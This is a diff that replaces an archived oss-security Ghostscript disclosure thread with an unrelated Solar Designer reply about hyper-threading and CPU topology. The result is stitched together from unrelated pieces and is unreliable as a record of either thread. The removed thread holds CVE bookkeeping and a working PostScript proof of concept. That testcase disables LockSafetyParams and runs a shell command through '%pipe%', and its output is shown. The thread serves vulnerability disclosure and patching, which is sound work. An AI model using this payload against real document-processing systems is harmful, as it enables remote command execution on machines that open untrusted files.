@@ -1,226 +1,59 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/03/2
-Message-ID: <20180903105747.dihmczuqhl4kcnx5@suse.de>
-Date: Mon, 3 Sep 2018 12:57:47 +0200
-From: Marcus Meissner <meissner@...e.de>
-To: oss-security@...ts.openwall.com
-Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/06/22/4
+Message-ID: <20180622141604.GA20634@openwall.com>
+Date: Fri, 22 Jun 2018 16:16:05 +0200
+From: Solar Designer <solar@...nwall.com>
+To: Michael Ellerman <mpe@...erman.id.au>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Intel hyper-threading security issues
 Content-Type: text/plain; charset=utf-8
 
-Hi,
-
-I am still holding back CVE requesting as CERT promised to do this.
-
-If they do not reply with a plan until tomorrow I will proceed with requesting.
-
-Ciao, Marcus
-On Wed, Aug 29, 2018 at 01:43:22PM -0700, Tavis Ormandy wrote:
-> I should note, just add `userdict /setpagedevice undef` at the top if you
-> want to test it with ImageMagick.
+On Fri, Jun 22, 2018 at 02:08:03PM +1000, Michael Ellerman wrote:
+> Solar Designer <solar@...nwall.com> writes:
+> > you can obtain the needed information from /proc/cpuinfo or
+> > /sys/devices/system/cpu/cpu*/topology/* to choose which logical CPUs you
+> > disable (so that you leave only one per physical core).
+> >
+> > On a related note, attached is a generic Linux /proc/cpuinfo parser
 > 
-> Tavis.
-> 
-> On Wed, Aug 29, 2018 at 1:14 PM Tavis Ormandy <taviso@...gle.com> wrote:
-> 
-> > Thanks Marcus, here are some more necessary commits:
-> >
-> >
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
-> > # 699654 D /invalidaccess checks stop working after a failed restore
-> >
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
-> > # 699670 gssetresolution memory corruption
-> >
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
-> > # 699671 handling /undefined results in SEGV
-> >
-> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
-> > # 699676 PDF interpreter can leave dangerous operators available
-> >
-> > Please note that not all issues are resolved, and I have exploits that
-> > still work against HEAD.
-> >
-> > For example, this will still work if you pull master as of this writing:
-> >
-> > $ cat testcase.pdf
-> > %!PS
-> > % This is ghostscript bug #699687 (split out from bug #699654)
-> >
-> > a0 % just select a papersize to initialize page device
-> >
-> > % You can't def HWResolution (for example), because currentpagedevice is
-> > readonly:
-> > %
-> > % GS>currentpagedevice wcheck ==
-> > % false
-> > %
-> > % But you can just put or astore into it, because the array itself is
-> > writable:
-> > % GS>currentpagedevice /HWResolution get wcheck ==
-> > % true
-> > %
-> > % If you put some junk in there, then grestore stops working.
-> > currentpagedevice /HWResolution get 0 (foobar) put
-> >
-> > % this grestore will fail, `stopped` just handles the error instead of
-> > aborting.
-> > { grestore } stopped {} if
-> >
-> > % now LockSafetyParams will be incorrectly unset, you can check like this:
-> > % GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams get
-> > == pop
-> > % false
-> >
-> > % we can change and configure devices now, so make sure we're using one
-> > with
-> > % a OutputFile property.
-> > (ppmraw) selectdevice
-> >
-> > % run a shell command
-> > mark /OutputFile (%pipe%id) currentdevice putdeviceprops
-> > showpage
-> > $ evince testcase.pdf
-> > uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
-> > context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
-> > (libspectre) ghostscript reports: ioerror -12
-> >
-> > Tavis.
-> >
-> > On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@...e.de> wrote:
-> >
-> >> Hi,
-> >>
-> >> I had 4 CVEs assigned yesterday afternoon already working from CERTs list,
-> >> see inline comments below. Please adjust if something is incorrect in
-> >> them.
-> >>
-> >> CERT has mailed overnight that they will take care of the CVE assignment,
-> >> so
-> >> I am defering the rest to them.
-> >>
-> >> Ciao, Marcus
-> >>
-> >> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
-> >> > Here is an update, Artifex made a press release
-> >> > <
-> >> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
-> >> >
-> >> > listing
-> >> > some necessary commits, but the list was incomplete.
-> >> >
-> >> > Here is a list of relevant commits I'm aware of so far, some issues are
-> >> > still open with working exploits available. It's my understanding that
-> >> no
-> >> > new release is planned until late September, and vendors need to either
-> >> > ship a git snapshot when all issues are resolved, or apply patches. I
-> >> have
-> >> > testcases for each problem, but I think the bugs will be visible
-> >> eventually
-> >> > so I'm not posting them here.
-> >> >
-> >> >
-> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
-> >> > # 699671
-> >> > handling /undefined results in SEGV
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
-> >> > # 699659 missing type check in ztype
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
-> >> > 699654 A /invalidaccess checks stop working after a failed restore
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33
-> >> #
-> >> > 699654 B /invalidaccess checks stop working after a failed restore
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486
-> >> #
-> >> > 699654 C /invalidaccess checks stop working after a failed restore
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716 #
-> >> 699655
-> >> > - missing type checking in setcolor
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde #
-> >> 699656
-> >>
-> >>
-> >> > - LockDistillerParams boolean missing type checks
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
-> >>         CVE-2018-15910
-> >>
-> >>
-> >> > # 699658 - Bypassing PermitFileReading by handling undefinedfilename
-> >> errors
-> >>
-> >>
-> >> >
-> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
-> >> > # 699660 - shading_param incomplete type checking
-> >> >
-> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
-> >> > # 699660 - shading_param incomplete type checking
-> >>         CVE-2018-15909
-> >>
-> >>
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
-> >> > # 699661 - pdf14 garbage collection memory corruption
-> >> >
-> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
-> >> > # 699663 - .setdistillerkeys memory corruption
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
-> >> > # 699664 - corrupt device object after error in job
-> >>
-> >>
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
-> >> > # 699657 - .tempfile SAFER restrictions seem to be broken
-> >>         CVE-2018-15908
-> >>
-> >> >
-> >> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
-> >>
-> >>
-> >> > # 699665 - memory corruption in aesdecode
-> >> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
-> >>
-> >>         CVE-2018-15911
-> >>
-> >> > # 699668 - .definemodifiedfont memory corruption if /typecheck is
-> >> handled
-> >> >
-> >> > Tavis
-> >> >
-> >> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
-> >> > bfriesen@...ple.dallas.tx.us> wrote:
-> >> >
-> >> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
-> >> > > >
-> >> > > > (Regarding the `file.ps2' and `file.ps3' examples without `PS2:' or
-> >> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it seems
-> >> > > > that they ends up as:
-> >> > > >
-> >> > > > Domain: Coder; rights=Read; pattern="PS" ...
-> >> > > >
-> >> > > > ...so should be blocked by the workaround described in
-> >> > > > VU#332928. But please correct me if I'm wrong.)
-> >> > >
-> >> > > This is likely due to header magic detection (e.g. "%!PS-Adobe").  It
-> >> > > is possible that a different path will be taken if the common
-> >> > > Postscript header is not detected.  The file extension may then be
-> >> > > used as a hint.  Also, there are a wide varieties of ImageMagick
-> >> > > versions in use, with a wide variety of behaviors.
-> >> > >
-> >> > > The version of ImageMagick provided by the Ubuntu Linux I am using at
-> >> > > this moment dates from 2012!
-> >> > >
-> >> > > Bob
-> >> > > --
-> >> > > Bob Friesenhahn
-> >> > > bfriesen@...ple.dallas.tx.us,
-> >> http://www.simplesystems.org/users/bfriesen/
-> >> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
-> >> > >
-> >>
-> >> --
-> >> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
-> >> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
-> >> meissner@...e.de>
-> >>
-> >
+> I guess by "generic" you mean Intel & AMD? :)
 
--- 
-Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@...e.de>
+Actually, I meant not making any assumptions about the ordering of
+logical CPUs, which I saw vary even between similar systems.  But you're
+right - this is x86-specific - should work on Linux kernels built for
+i686, x86_64, k1om (aka MIC), tested starting with RHEL5'ish systems.
+The sysfs approach is probably preferable.
+
+> It won't work on powerpc, or arm, or arm64 ...
+> 
+> You should be able to determine all of the info you need from the sysfs
+> topology files, which work across arches.
+> 
+> See the script below for example, which shows CPUs grouped by core.
+
+Thanks.  FWIW, your script does indeed work fine on GCC Compile Farm's
+POWER7 box running CentOS 7.4:
+
+[solar@...1-power7 ~]$ ./cpu.py
+0: 0, 1, 2, 3
+4: 4, 5, 6, 7
+8: 8, 9, 10, 11
+12: 12, 13, 14, 15
+16: 16, 17, 18, 19
+20: 20, 21, 22, 23
+24: 24, 25, 26, 27
+28: 28, 29, 30, 31
+32: 32, 33, 34, 35
+36: 36, 37, 38, 39
+40: 40, 41, 42, 43
+44: 44, 45, 46, 47
+48: 48, 49, 50, 51
+52: 52, 53, 54, 55
+56: 56, 57, 58, 59
+60: 60, 61, 62, 63
+
+This is consistent with my benchmarks of different thread affinity
+settings on that box (e.g., "GOMP_CPU_AFFINITY=0-63:4
+OMP_NUM_THREADS=16" to use one thread per core in OpenMP).
+
+Alexander
